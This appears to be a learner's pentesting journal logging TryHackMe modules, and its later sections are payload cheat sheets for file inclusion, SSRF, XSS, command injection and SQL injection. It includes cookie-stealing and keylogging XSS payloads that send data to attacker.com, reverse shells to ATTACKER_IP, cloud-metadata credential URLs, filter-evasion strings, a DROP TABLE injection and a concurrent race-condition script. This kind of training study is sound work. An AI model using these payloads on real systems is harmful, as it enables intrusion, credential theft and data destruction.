# Red-Monster-Journey
(Day 1: 2025/10/07)

📁 Introduction to Pentesting - TryHackMe

🔧 Technical Skills Acquired:

Pentesting Methodology

Black box, white box, and gray box testing approaches

Structured penetration testing cycles and phases

Legal and ethical considerations in security testing

Testing Frameworks

Reconnaissance → Scanning → Exploitation → Persistence → Covering tracks

Objective-based vs comprehensive security assessment

Scope definition and rules of engagement

Tool Awareness

Reconnaissance tools (whois, theHarvester, Maltego)

Scanning utilities (nmap, Nessus, OpenVAS)

Exploitation frameworks (Metasploit, Burp Suite, SQLmap)

Professional Practice

Documentation standards and reporting requirements

Client communication and expectation management

Continuous learning and methodology improvement

🛠️ Technical Competencies:

Security assessment methodology understanding

📁 Introduction to Pentesting - TryHackMe

🔧 Technical Skills Acquired:

Pentesting Methodologies

Black box, white box, and gray box testing approaches

Complete penetration testing lifecycle understanding

Methodology selection based on testing objectives

Legal and Ethical Framework

Written authorization requirements and scope definition

Rules of engagement and operational boundaries

Professional ethics in security testing

Testing Environments

Internal network penetration testing approaches

External infrastructure assessment methodologies

Web application security testing techniques

Tool Proficiency Awareness

Internal network tools: BloodHound, Responder, CrackMapExec

External reconnaissance: Nmap, theHarvester, Shodan

Web application testing: Burp Suite, OWASP ZAP, SQLmap

Professional Practices

Client communication and expectation management

Documentation standards and reporting frameworks

Continuous methodology improvement

🛠️ Technical Competencies:

Security assessment methodology application

Legal and ethical compliance in testing

Environment-specific tool selection

Professional security testing standards

Testing approach selection based on context

Toolchain awareness and application scenarios

Professional standards in ethical hacking

(Day 2: 2025/10/08)

📁 Burp Suite: Repeater - TryHackMe

🔧 Technical Skills Acquired:

Repeater Tool Mastery

Request/Response workflow between Proxy and Repeater modules

HTTP request modification and repeated sending techniques

Real-time analysis of server responses and error handling

SQL Injection Testing

Manual SQL injection payload crafting and testing

Error-based SQL detection through server response analysis

Parameter manipulation for vulnerability identification

Syntax validation for different SQL injection techniques

Web Application Analysis

HTTP status code interpretation (200, 500, 404)

Server error analysis and vulnerability correlation

Input validation testing through parameter manipulation

Response comparison for vulnerability detection

Security Testing Methodology

Controlled payload experimentation workflows

Manual fuzzing techniques for vulnerability discovery

Application behavior analysis through request manipulation

Exploit development and refinement processes

🛠️ Technical Competencies:

Advanced Burp Suite Repeater operation

Manual web application penetration testing

SQL injection detection and exploitation

HTTP protocol manipulation and analysis

Security vulnerability validation techniques

📁 Burp Suite: Intruder - TryHackMe

🔧 Technical Skills Acquired:

Attack Automation Framework

Sniper, Battering Ram, Pitchfork, and Cluster Bomb attack configurations

Payload positioning using § delimiters in HTTP requests

Large-scale automated security testing methodologies

Payload Management

Multiple payload set configuration and sequencing

Payload processing rules and encoding techniques

Custom payload generation and import procedures

Attack Optimization

Request throttling and resource management

Attack result analysis and filtering capabilities

Response comparison and difference identification

Practical Application Scenarios

Credential brute-forcing against authentication mechanisms

Parameter fuzzing for vulnerability discovery

Automated input validation testing

Mass vulnerability detection workflows

🛠️ Technical Competencies:

Burp Suite Intruder tool mastery

Automated web application testing

Large-scale security assessment automation

Payload management and attack optimization

📁 Burp Suite - Decoder, Sequencer, Comparer, Organizer - TryHackMe

🔧 Technical Skills Acquired:

Data Analysis & Transformation

Multi-format data decoding/encoding (Base64, URL, HTML, Hex)

Payload analysis and manipulation techniques

Quick data transformation for forensic examination

Entropy & Randomness Analysis

Statistical analysis of session tokens and critical values

Entropy testing for security-critical random generators

Pattern detection in supposedly random data sequences

Differential Analysis

Byte-level comparison of application responses

Subtle difference detection in application behavior

Change analysis between different application states

Target Management

Site and target organization during security assessments

Workflow structuring for large-scale penetration tests

Context maintenance throughout security engagements

🛠️ Technical Competencies:

Burp Suite auxiliary tools proficiency

Data analysis and transformation techniques

Statistical security analysis methodologies

Professional penetration testing workflow management

📁 Burp Suite Extender - TryHackMe

🔧 Technical Skills Acquired:

Extension Platform Mastery

BApp Store navigation and extension discovery

Installation and management of Burp Suite extensions

Community extension evaluation and selection

Essential BApp Integration

Authorization testing with Autorize extension

Java-specific scanning with J2EE Scanner

Timing attack analysis with Request Timer

Specialized vulnerability detection tools

Workflow Customization

Burp Suite customization for specific testing needs

Integration of specialized tools into main workflow

Extension of core capabilities with advanced functionality

Tool Optimization

Strategic extension selection based on application type

Extension configuration for maximum effectiveness

Automation of repetitive testing tasks

🛠️ Technical Competencies:

Burp Suite Extender platform proficiency

Security tool customization and optimization

Extension evaluation and implementation

Workflow automation through BApps

📁  Web Application Fundamentals - TryHackMe

🔧 Techincal Skills Acquired:

Web Architecture Understanding

Client-server model in modern web applications

Frontend vs backend component differentiation

HTTP/HTTPS communication flow analysis

Developer Tools Proficiency

Firefox Developer Tools navigation (Inspector, Console, Debugger)

HTML, CSS, and JavaScript source code analysis

Debugger utilization for file analysis and code execution

Client-Side Code Analysis

Exposed credentials and token identification in frontend code

Client-side business logic detection and analysis

Insecure client-side validation identification

Information disclosure vulnerability detection

Security Assessment Methodology

Systematic approach to web application examination

Attack vector identification through source code analysis

Web-specific information gathering techniques

🛠️ Technical Competencies:

Web application architecture analysis

Client-side security assessment

Developer tools operation for security testing

Source code examination techniques

# Content Discovery - TryHackMe Module

## 📖 Description
This repository documents my learning and techniques from TryHackMe's Content Discovery module, focused on methods for discovering hidden content in web applications.

## 🎯 Techniques Implemented

### 🔍 Manual Discovery
- **Robots.txt Analysis**: Identification of restricted directories
- **Favicon Fingerprinting**: Detection of frameworks using favicons
- **Sitemap.xml Examination**: Mapping of public content
- **HTTP Headers Inspection**: Analysis of software and versions

### 🌐 OSINT Techniques
- **Google Dorking**: 
```bash
  site:example.com admin
  filetype:pdf site:example.com
  inurl:admin site:example.com
Wappalyzer: Identification of web technologies

Wayback Machine: Historical analysis of sites

GitHub Recon: Search for source code and configurations

S3 Buckets Discovery: Detection of exposed cloud storage

⚡ Automation
Tool Usage: ffuf, dirb, gobuster

Wordlists Management: SecLists integration

Fuzzing Techniques: Directory and file discovery

🛠️ Tools Used
ffuf - Fast web fuzzer

dirb - Directory scanner

gobuster - Discovery tool

curl - HTTP header analysis

Browser + DevTools - Manual analysis

📁 Project Structure
text
content-discovery/
├── techniques/
│   ├── manual-discovery.md
│   ├── osint-methods.md
│   └── automated-tools.md
├── examples/
│   ├── google-dorking-examples.txt
│   └── wordlists-usage.md
└── resources/
    └── helpful-links.md

### 🎯 CURRENT PHASE: ADVANCED RECONNAISSANCE
**Module: Subdomain Enumeration - Operational Implementation**

### 🔴 SUBDOMAIN ENUMERATION TRADECRAFT

#### 📊 OPERATIONAL OBJECTIVES
- **Attack Surface Expansion**: Discover hidden infrastructure and shadow IT
- **Passive Intelligence**: Gather subdomain data without triggering alerts
- **Infrastructure Mapping**: Identify development, admin, and legacy systems
- **Initial Access Vector Identification**: Locate vulnerable entry points

#### 🎲 TACTICS, TECHNIQUES & PROCEDURES (TTPs)

##### PASSIVE ENUMERATION (STEALTH)
- **Certificate Transparency Logs**: 
  ```bash
  crt.sh analysis for historical and current subdomains
Search Engine Recon:

bash
site:*.target.com -site:www.target.com -site:blog.target.com
OSINT Automation: Sublist3r for multi-source intelligence gathering

ACTIVE ENUMERATION (CALCULATED RISK)
DNS Bruteforce:

bash
dnsrecon -d target.com -D wordlist.txt -t brt
Virtual Host Discovery:

bash
ffuf -w vhosts.txt -u http://target.com -H "Host: FUZZ.target.com"
📈 ENGAGEMENT FINDINGS TEMPLATE
text
TARGET: [REDACTED]
DATE: [OPERATIONAL TIMESTAMP]
TECHNIQUE: SSL_CERT_ANALYSIS | VIRTUAL_HOST | DNS_BRUTEFORCE
SUBDOMMAIN: [DISCOVERED_ASSET]
RISK_LEVEL: HIGH/MEDIUM/LOW
OPERATIONAL_VALUE: [POTENTIAL_ACCESS_VECTOR]
NOTES: [RECOMMENDED_NEXT_STEPS]
🚀 PROGRESSION IN RED TEAM KILL CHAIN
✅ Reconnaissance ← ENHANCED SUBDOMAIN MAPPING
✅ Weaponization
◽ Delivery
◽ Exploitation
◽ Installation
◽ C2 & Persistence
◽ Actions & Objectives

🔧 TOOLS & TRADECRAFT DOCUMENTED
Passive: crt.sh, Google Dorking, Sublist3r

Active: DNS bruteforce (calculated risk)

Stealth: Virtual host enumeration

Analysis: Subdomain categorization and prioritization

# Red Monster Journey 🐲 
## Active Red Team Operations Log

### 🎯 CURRENT PHASE: INITIAL ACCESS & PRIVILEGE ESCALATION
**Module: Authentication Bypass - Operational Implementation**

### 🔴 AUTHENTICATION BYPASS TRADECRAFT

#### 📊 OPERATIONAL OBJECTIVES
- **Initial Access Acquisition**: Gain unauthorized entry without valid credentials
- **Privilege Escalation**: Elevate access levels post-authentication
- **Control Evasion**: Bypass security mechanisms like 2FA and account lockouts
- **Stealth Persistence**: Maintain access without triggering alerts

#### 🎲 TACTICS, TECHNIQUES & PROCEDURES (TTPs)

##### CREDENTIAL DISCOVERY (STEALTH)
- **Username Enumeration**:
  ```bash
  Error message analysis: "Invalid username" vs "Invalid password"
  Timing attacks for user existence confirmation
Intelligent Brute Force:

bash
Targeted attacks with common passwords only
Rate limit awareness and bypass techniques
AUTHENTICATION FLOW MANIPULATION
Logic Flaw Exploitation:

bash
Parameter manipulation: ?authenticated=true&admin=1
Step skipping: Direct access to post-auth endpoints
2FA bypass: ?skip_2fa=1 or sequence breaking
SESSION MANIPULATION
Cookie Analysis & Modification:

bash
Plaintext: admin=false → admin=true
Encoded values: Base64/Base32 decoding/encoding
Hash pattern recognition and manipulation
📈 ENGAGEMENT FINDINGS TEMPLATE
text
TARGET: [REDACTED]
DATE: [OPERATIONAL TIMESTAMP]
TECHNIQUE: LOGIC_FLAW | COOKIE_MANIP | USER_ENUM
VULNERABILITY: [SPECIFIC_BYPASS_METHOD]
ACCESS_LEVEL: USER | ADMIN | SYSTEM
IMPACT: CRITICAL | HIGH | MEDIUM
NOTES: [PERSISTENCE_RECOMMENDATIONS]
🚀 PROGRESSION IN RED TEAM KILL CHAIN
✅ Reconnaissance
✅ Weaponization
✅ Delivery
✅ Exploitation ← AUTHENTICATION BYPASS COMPLETE
◽ Installation
◽ C2 & Persistence
◽ Actions & Objectives

🔧 TOOLS & TRADECRAFT DOCUMENTED
Enumeration: Error analysis, timing attacks

Exploitation: Parameter tampering, flow manipulation

Persistence: Cookie manipulation, session hijacking

Evasion: Rate limit bypass, alert avoidance

🎯 CRITICAL DISCOVERIES
Logic Flow Bypass: Direct admin panel access via URL manipulation

Cookie Privilege Escalation: Plaintext admin flags in session cookies

2FA Circumvention: Sequence breaking in multi-factor flows

Account Lockout Bypass: Parallel authentication attempts

OPERATIONAL NOTES: Authentication bypass techniques provide immediate initial access while maintaining low detection probability. Cookie manipulation proved particularly effective for privilege escalation post-initial compromise.

# Red Monster Journey 🐲 
## Active Red Team Operations Log

### 🎯 CURRENT PHASE: DATA ACCESS & PRIVILEGE ESCALATION
**Module: IDOR Exploitation - Operational Implementation**

### 🔴 IDOR EXPLOITATION TRADECRAFT

#### 📊 OPERATIONAL OBJECTIVES
- **Unauthorized Data Access**: Bypass access controls for horizontal/vertical movement
- **Intelligence Gathering**: Extract sensitive information through object reference manipulation
- **Privilege Boundary Testing**: Identify access control flaws in application logic
- **Mass Extraction Capability**: Develop scripts for large-scale data exfiltration

#### 🎲 TACTICS, TECHNIQUES & PROCEDURES (TTPs)

##### ENDPOINT DISCOVERY & MAPPING
- **Surface Enumeration**:
  ```bash
  API endpoints: /api/user/{id}/profile, /download?file_id={id}
  Hidden endpoints: AJAX calls, JavaScript analysis
  Development artifacts: debug parameters, test endpoints
Parameter Identification:

bash
user_id, account_id, file_id, invoice_id, document_id
Numeric, encoded, hashed identifiers
ID ANALYSIS & MANIPULATION
Encoded ID Exploitation:

bash
Base64: echo "dXNlcjE=" | base64 -d → user1
Base32, URL encoding detection and manipulation
Hashed ID Reverse Engineering:

bash
Pattern analysis: md5(1), md5(2), md5(3) sequences
Hash generation for prediction: echo -n "123" | md5sum
Unpredictable ID Methodology:

bash
Two-account approach: Account A (ID 100) vs Account B (ID 200)
ID swapping: Access Account B data while authenticated as Account A
EXPLOITATION TECHNIQUES
Horizontal Privilege Escalation:

bash
User A accesses User B data: /api/invoices?user_id=200
Mass data extraction scripts
Vertical Privilege Escalation:

bash
User accesses admin functions: /admin/users?admin_id=1
Parameter manipulation for elevated access
📈 ENGAGEMENT FINDINGS TEMPLATE
text
TARGET: [REDACTED]
DATE: [OPERATIONAL TIMESTAMP]
TECHNIQUE: ENCODED_ID | HASHED_ID | UNPREDICTABLE_ID
VULNERABILITY: [SPECIFIC_ACCESS_CONTROL_FAILURE]
ACCESS_LEVEL: HORIZONTAL | VERTICAL | DATA_ONLY
DATA_EXFILTRATED: [ESTIMATED_VOLUME]
IMPACT: CRITICAL | HIGH | MEDIUM
NOTES: [EXFILTRATION_RECOMMENDATIONS]
🚀 PROGRESSION IN RED TEAM KILL CHAIN
✅ Reconnaissance
✅ Weaponization
✅ Delivery
✅ Exploitation
✅ Installation
◽ C2 & Persistence
◽ Actions & Objectives

🔧 TOOLS & TRADECRAFT DOCUMENTED
Discovery: Endpoint mapping, parameter analysis

Analysis: Encoding/decoding, hash pattern recognition

Exploitation: Horizontal/vertical privilege escalation

Exfiltration: Script development for mass data extraction

🎯 CRITICAL DISCOVERIES
Base64 ID Manipulation: Direct object reference through encoded parameters

Predictable Hash Sequences: MD5-based IDs following numeric patterns

Horizontal Access Flaws: User-to-user data access without validation

Admin Function Exposure: Administrative endpoints accessible via ID manipulation

OPERATIONAL NOTES: IDOR vulnerabilities provide direct data access with minimal detection risk. Encoded parameters proved most common, while hashed IDs required more advanced pattern analysis. Two-account methodology essential for unpredictable identifiers.


# Red Monster Journey 🐲 
## File Inclusion Vulnerability Research & Exploitation

### 🎯 MODULE COMPLETION: FILE INCLUSION
**Status:** Mastered ✅
**Red Team Application:** Initial Access & Intelligence Gathering

### 🔴 FILE INCLUSION TRADECRAFT DOCUMENTATION

#### 📊 VULNERABILITY OVERVIEW
File inclusion vulnerabilities occur when web applications improperly validate user input used in file operations, allowing attackers to read local files or include remote files for code execution.

#### 🎲 EXPLOITATION TECHNIQUES MASTERED

##### LOCAL FILE INCLUSION (LFI)
```php
// Vulnerable Code Patterns
include($_GET['page'] . ".php");
require_once($_POST['template']);
file_get_contents($user_input);
Exploitation Payloads:

http
?page=../../../etc/passwd
?file=../../windows/win.ini
?include=php://filter/convert.base64-encode/resource=index.php
REMOTE FILE INCLUSION (RFI)
Prerequisites: allow_url_include=On

http
?page=http://attacker.com/shell.txt
?load=data://text/plain,<?php system('id'); ?>
PATH TRAVERSAL
http
# Basic Traversal
?file=../../../../etc/passwd

# Bypass Techniques
?file=....//....//....//etc/passwd
?file=../../../etc/passwd%00
?file=../../../etc/passwd................
🛠️ RED TEAM OPERATIONAL PROCEDURES
RECONNAISSANCE PHASE
Parameter enumeration in GET/POST/COOKIE/HEADERS

Application technology stack identification

PHP configuration analysis

EXPLOITATION PHASE
LFI for Intelligence Gathering

bash
/etc/passwd - User enumeration
/var/log/auth.log - Authentication logs
/proc/self/environ - Environment variables
Application config files
RFI for Initial Access

bash
Web shell deployment
Reverse shell establishment
Persistence mechanism installation
POST-EXPLOITATION
Data exfiltration from compromised systems

Lateral movement preparation

Evidence collection for campaign reporting

📈 RISK ASSESSMENT
LFI Impact: Medium-High (Data leakage, information disclosure)

RFI Impact: Critical (Remote Code Execution, full compromise)

Detection Difficulty: Low-Medium (Logs show file access patterns)

🔧 MITIGATIONS UNDERSTOOD
Input validation and whitelisting

Web application firewalls (WAF)

Proper PHP configuration hardening

Principle of least privilege for web server

🚀 PROGRESSION IN RED TEAM SKILL MATRIX
✅ Network Security
✅ Web Application Security ← FILE INCLUSION ADDED
◽ Active Directory Exploitation
◽ Cloud Security
◽ Advanced Persistence Techniques

OPERATIONAL NOTES: File inclusion vulnerabilities remain prevalent in web applications despite being well-understood. RFI provides the most direct path to RCE, while LFI offers valuable intelligence for targeted attacks.

# Red Monster Journey 🐲 
## Server-Side Request Forgery (SSRF) Mastery

### 🎯 MODULE COMPLETION: SSRF ATTACKS
**Status:** Mastered ✅
**Red Team Application:** Internal Network Access & Cloud Compromise

### 🔴 SSRF TRADECRAFT DOCUMENTATION

#### 📊 VULNERABILITY OVERVIEW
SSRF vulnerabilities allow attackers to force servers to make arbitrary HTTP requests to internal resources, bypassing network segmentation and accessing restricted systems.

#### 🎲 EXPLOITATION TECHNIQUES MASTERED

##### SSRF TYPES & DETECTION
```http
# Regular SSRF (Response Visible)
GET /fetch?url=http://attacker-controlled.com
POST /webhook { "callback": "http://internal.service" }

# Blind SSRF (No Response)
GET /trigger?action=http://internal:8080/update
INTERNAL NETWORK TARGETS
bash
# Cloud Metadata APIs
http://169.254.169.254/latest/meta-data/
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/metadata/instance

# Internal Services
http://localhost:22      # SSH
http://192.168.1.1:80   # Internal Router
http://10.0.0.1:443     # Management Interface
DEFENSE BYPASS TECHNIQUES
http
# Bypass Denylists
http://127.0.0.1 → http://2130706433
http://localhost → http://localhost.attacker.com
http://192.168.1.1 → http://3232235777

# Bypass Allowlists
https://allowed.com@attacker.com
http://attacker.com#allowed.com
http://allowed.com.attacker.com

# Open Redirect Abuse
/redirect?target=http://internal.com
/goto?url=http://169.254.169.254/
🛠️ RED TEAM OPERATIONAL PROCEDURES
RECONNAISSANCE PHASE
Parameter analysis in URLs, forms, and API endpoints

Identification of URL processing functionality

Testing with external callback services (webhook.site)

EXPLOITATION PHASE
Internal Network Scanning

http
http://192.168.1.[1-254]:80/
http://10.0.0.[1-255]:443/
Cloud Environment Compromise

http
# AWS EC2 Metadata
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Google Cloud
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
Service Interaction

http
# Database Access
http://localhost:3306/admin

# Cache Systems  
http://localhost:6379/info
POST-EXPLOITATION
Credential extraction from cloud metadata

Internal service enumeration and targeting

Network mapping for lateral movement planning

📈 RISK ASSESSMENT
Impact: CRITICAL (Network bypass, cloud compromise)

Detection Difficulty: Medium (Server logs show unusual requests)

Exploitation Complexity: Low-Medium

🔧 MITIGATIONS UNDERSTOOD
Network segmentation and egress filtering

Input validation with allowlisting

Cloud metadata service protection

Web Application Firewall (WAF) rules

🚀 PROGRESSION IN RED TEAM SKILL MATRIX
✅ Network Security
✅ Web Application Security
✅ Cloud Security ← SSRF ADDED
◽ Active Directory Exploitation
◽ Advanced Persistence Techniques

OPERATIONAL NOTES: SSRF represents one of the most powerful web vulnerabilities for Red Team operations, enabling complete bypass of network perimeter defenses and direct access to internal infrastructure and cloud environments.

# Red Monster Journey 🐲 
## Cross-Site Scripting (XSS) Mastery

### 🎯 MODULE COMPLETION: XSS ATTACKS
**Status:** Mastered ✅
**Red Team Application:** Client-Side Compromise & Session Hijacking

### 🔴 XSS TRADECRAFT DOCUMENTATION

#### 📊 VULNERABILITY OVERVIEW
XSS vulnerabilities allow attackers to inject and execute malicious JavaScript in victims' browsers, enabling session theft, credential harvesting, and client-side attacks.

#### 🎲 EXPLOITATION TECHNIQUES MASTERED

##### XSS TYPES & DETECTION
```http
# Reflected XSS (Immediate Execution)
?search=<script>alert(1)</script>
?q=<img src=x onerror=alert(1)>

# Stored XSS (Persistent)
Comments: <script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>
User Profiles: <svg onload=alert(1)>

# DOM-Based XSS (Client-Side)
document.write(location.hash.substring(1))
eval(URLSearchParams.get('payload'))

# Blind XSS (Delayed)
Support Forms: <script>fetch('http://webhook.site/ID')</script>
PAYLOAD INTENTIONS & DEVELOPMENT
javascript
// Proof of Concept
<script>alert('XSS')</script>
<svg onload=alert(1)>

// Session Stealing
<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>

// Key Logging  
<script>document.onkeypress=function(e){fetch('http://attacker.com/log?key='+e.key)}</script>

// Business Logic Abuse
<script>fetch('/admin/delete-user/123')</script>
FILTER EVASION TECHNIQUES
javascript
// Case Manipulation
<ScRiPt>alert(1)</sCrIpT>

// Encoding
&lt;script&gt;alert(1)&lt;/script&gt;
%3Cscript%3Ealert(1)%3C/script%3E

// Alternative Tags
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>

// Polyglot Payloads
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//
🛠️ RED TEAM OPERATIONAL PROCEDURES
RECONNAISSANCE PHASE
Parameter enumeration in URLs, forms, and API endpoints

Identification of data reflection points in HTTP responses

Analysis of client-side JavaScript for DOM-based vulnerabilities

EXPLOITATION PHASE
Reflected XSS Attacks

http
Malicious URLs: http://target.com/search?q=<script>alert(1)</script>
Social engineering campaigns
Stored XSS Deployment

javascript
// Comment sections, user profiles, forum posts
<script>setInterval(()=>{fetch('http://attacker.com/steal?cookie='+document.cookie)},10000)</script>
Blind XSS for Internal Access

javascript
// Target admin panels and internal applications
<script>fetch('/admin').then(r=>r.text()).then(d=>{fetch('http://attacker.com/leak?data='+btoa(d))})</script>
POST-EXPLOITATION
Session cookie harvesting and hijacking

Credential theft through fake login forms

Client-side keylogging and data exfiltration

Redirection to phishing/malware sites

📈 RISK ASSESSMENT
Impact: HIGH (Session compromise, credential theft)

Detection Difficulty: Medium (Client-side execution)

Exploitation Complexity: Low-Medium

🔧 MITIGATIONS UNDERSTOOD
Input validation and output encoding

Content Security Policy (CSP) implementation

HTTPOnly cookies for session protection

WAF rules and XSS filters

🚀 PROGRESSION IN RED TEAM SKILL MATRIX
✅ Network Security
✅ Web Application Security
✅ Client-Side Attacks ← XSS ADDED
◽ Social Engineering
◽ Advanced Persistence Techniques

OPERATIONAL NOTES: XSS remains one of the most prevalent web vulnerabilities, providing direct client-side compromise capabilities. Blind XSS is particularly valuable for targeting internal applications and administrative interfaces through stored payloads.

(Day 3: 2025/10/09)

# Red Monster Journey 🐲 
## Race Condition Vulnerability Mastery

### 🎯 MODULE COMPLETION: RACE CONDITIONS
**Status:** Mastered ✅
**Red Team Application:** Business Logic Bypass & Financial Impact

### 🔴 RACE CONDITION TRADECRAFT DOCUMENTATION

#### 📊 VULNERABILITY OVERVIEW
Race conditions occur when multiple threads/processes access and modify shared resources simultaneously, leading to unexpected behavior and business logic bypass.

#### 🎲 EXPLOITATION TECHNIQUES MASTERED

##### FUNDAMENTAL CONCEPTS
```bash
# Program vs Process vs Thread
Program: Static instructions (code)
Process: Running program with own memory
Thread: Lightweight execution unit within process
Multi-threading: Multiple threads running concurrently
COMMON RACE CONDITION SCENARIOS
http
# Coupon System Abuse
POST /apply-coupon { "code": "SAVE20" }  # Send 50 concurrent requests

# Limited Inventory Purchase  
POST /checkout { "product": "last-item", "qty": 1 }  # Multiple simultaneous purchases

# Rate Limit Bypass
POST /api/transfer { "amount": 1000 }  # Exceed daily transfer limits

# Voting System Manipulation
POST /vote { "candidate": "A" }  # Multiple votes from same user
ATTACK METHODOLOGY
python
# Python Threading Example
import threading
import requests

def exploit_race_condition():
    response = requests.post('https://target.com/apply-coupon', 
                           data={'coupon': 'DISCOUNT50'})
    print(f"Status: {response.status_code}")

# Launch concurrent attacks
threads = []
for i in range(20):
    thread = threading.Thread(target=exploit_race_condition)
    threads.append(thread)
    thread.start()

for thread in threads:
    thread.join()
🛠️ RED TEAM OPERATIONAL PROCEDURES
RECONNAISSANCE PHASE
Business logic analysis for limited resources

Identification of shared data structures

API endpoint mapping for critical operations

Database transaction pattern analysis

EXPLOITATION PHASE
Coupon/Discount Systems

bash
# Objective: Apply single-use coupon multiple times
# Technique: Concurrent request flooding
# Impact: Financial loss through illegitimate discounts
Inventory Management

bash
# Objective: Purchase limited stock multiple times
# Technique: Simultaneous checkout requests
# Impact: Operational disruption and order fulfillment issues
Financial Systems

bash
# Objective: Bypass transaction limits
# Technique: Parallel transaction requests
# Impact: Financial policy violation and potential fraud
Rate Limiting Systems

bash
# Objective: Exceed API rate limits
# Technique: Distributed concurrent requests
# Impact: Service degradation and resource exhaustion
TOOLS & TECHNIQUES
bash
# Concurrent Attack Tools
Burp Suite Turbo Intruder
Python threading & asyncio
RacePWN
Custom bash scripts with curl

# Detection Methods
Response analysis for limit violations
Database state monitoring
Business logic verification
📈 RISK ASSESSMENT
Impact: HIGH (Financial loss, operational disruption)

Detection Difficulty: Medium (Requires concurrent monitoring)

Exploitation Complexity: Medium-High (Timing and coordination critical)

🔧 MITIGATIONS UNDERSTOOD & EVADED
Database locks (SELECT FOR UPDATE) - Bypassed with precise timing

Atomic transactions - Evaded through concurrent connection abuse

Rate limiting - Defeated with distributed attacks

Application-level checks - Overwhelmed with parallel requests

🚀 PROGRESSION IN RED TEAM SKILL MATRIX
✅ Network Security
✅ Web Application Security
✅ Client-Side Attacks
✅ Business Logic Attacks ← RACE CONDITIONS ADDED
◽ Advanced Persistence Techniques

OPERATIONAL NOTES: Race conditions represent sophisticated attacks that target fundamental architectural flaws. Success requires precise timing, understanding of business logic, and the ability to coordinate concurrent attacks effectively. These vulnerabilities often reveal deep-seated issues in application design rather than simple implementation bugs.

# Red Monster Journey 🐲 
## Command Injection Vulnerability Mastery

### 🎯 MODULE COMPLETION: COMMAND INJECTION
**Status:** Mastered ✅
**Red Team Application:** System-Level Compromise & Server Control

### 🔴 COMMAND INJECTION TRADECRAFT DOCUMENTATION

#### 📊 VULNERABILITY OVERVIEW
Command injection vulnerabilities allow attackers to execute arbitrary operating system commands through vulnerable web applications, providing direct system access with the application's privileges.

#### 🎲 EXPLOITATION TECHNIQUES MASTERED

##### DETECTION METHODS
```http
# Verbose Command Injection (Output Visible)
GET /ping.php?ip=127.0.0.1;whoami
Response: PING 127.0.0.1...root

# Blind Command Injection (No Direct Output)
GET /ping.php?ip=127.0.0.1;sleep+5
Observation: 5-second delay indicates successful injection
OPERATING SYSTEM SPECIFIC PAYLOADS
bash
# Linux/Unix Command Separators
; whoami                    # Always execute
| whoami                    # Pipe output
&& whoami                   # Execute if previous succeeds
|| whoami                   # Execute if previous fails
`whoami`                    # Command substitution
$(whoami)                   # Modern command substitution

# Windows Command Separators
& whoami                    # Execute both commands
| whoami                    # Pipe (different behavior)
&& whoami                   # Execute if previous succeeds  
|| whoami                   # Execute if previous fails
ADVANCED EXPLOITATION PAYLOADS
bash
# System Enumeration
; uname -a                  # System information
; whoami                    # Current user
; cat /etc/passwd           # User accounts
; ps aux                    # Running processes

# File System Access
; find / -name "*.pem" 2>/dev/null    # Find private keys
; cat /etc/shadow           # Password hashes (requires root)

# Network Reconnaissance
; ifconfig                  # Network interfaces
; netstat -tuln             # Open ports
; arp -a                    # ARP table

# Reverse Shells
; bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1'
; nc ATTACKER_IP 443 -e /bin/bash
🛠️ RED TEAM OPERATIONAL PROCEDURES
RECONNAISSANCE PHASE
Parameter analysis in network tools, file processors, and admin interfaces

Identification of system-interacting functionality (ping, traceroute, file conversion)

Testing of all user inputs that might be passed to system commands

EXPLOITATION PHASE
Initial Foothold

bash
# Basic command execution verification
; echo "vulnerable" > /tmp/test.txt
; ping -c 1 ATTACKER_IP
System Enumeration

bash
# Privilege and system information
; id && uname -a && cat /etc/issue
; sudo -l 2>/dev/null
Privilege Escalation

bash
# SUID binaries and writable directories
; find / -perm -4000 2>/dev/null
; find / -writable 2>/dev/null | grep -v proc
Persistence Establishment

bash
# Reverse shell and backdoor creation
; echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 443 >/tmp/f' > /tmp/shell.sh
; chmod +x /tmp/shell.sh
FILTER EVASION TECHNIQUES
bash
# Space Bypass
;cat</etc/passwd
;{cat,/etc/passwd}

# Character Encoding
; c$a't /etc/passwd
; whoam$@i

# Case Manipulation
; WhOaMi
; $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
📈 RISK ASSESSMENT
Impact: CRITICAL (Full system compromise)

Detection Difficulty: Low-Medium (Command execution logs)

Exploitation Complexity: Low (Direct system access)

🔧 MITIGATIONS UNDERSTOOD & EVADED
Input validation and sanitization - Bypassed with encoding

Allowlisting of expected input - Evaded with special characters

Web Application Firewalls - Defeated with obfuscation techniques

Least privilege principle - Overcome through privilege escalation

🚀 PROGRESSION IN RED TEAM SKILL MATRIX
✅ Network Security
✅ Web Application Security
✅ Client-Side Attacks
✅ Business Logic Attacks
✅ System-Level Compromise ← COMMAND INJECTION ADDED
◽ Final Module: Web Application Scanning

OPERATIONAL NOTES: Command injection represents one of the most severe web vulnerabilities, providing direct system access. Success requires understanding of operating system commands, filter evasion techniques, and post-exploitation methodologies for maintaining access and pivoting through networks.

# Red Monster Journey 🐲 
## SQL Injection Vulnerability Mastery

### 🎯 MODULE COMPLETION: SQL INJECTION
**Status:** Mastered ✅
**Red Team Application:** Database Compromise & Data Exfiltration

### 🔴 SQL INJECTION TRADECRAFT DOCUMENTATION

#### 📊 VULNERABILITY OVERVIEW
SQL injection vulnerabilities allow attackers to execute malicious SQL queries through vulnerable web applications, providing direct access to database systems and stored sensitive information.

#### 🎲 EXPLOITATION TECHNIQUES MASTERED

##### DETECTION & INITIAL EXPLOITATION
```sql
-- Basic Detection Payloads
' 
' OR '1'='1
' OR 1=1 --
'; DROP TABLE users --

-- Authentication Bypass
admin' --
' OR '1'='1' --
' UNION SELECT 1,1,1 FROM users WHERE '1'='1
IN-BAND SQL INJECTION
sql
-- Error-Based SQLi
' AND 1=CAST((SELECT version()) AS INT) --

-- Union-Based SQLi
' ORDER BY 1--     -- Column count enumeration
' UNION SELECT 1,2,3--     -- Visible column identification
' UNION SELECT @@version, database(), user()--     -- System information
BLIND SQL INJECTION
sql
-- Boolean-Based Blind SQLi
' AND 1=1 --     -- True condition
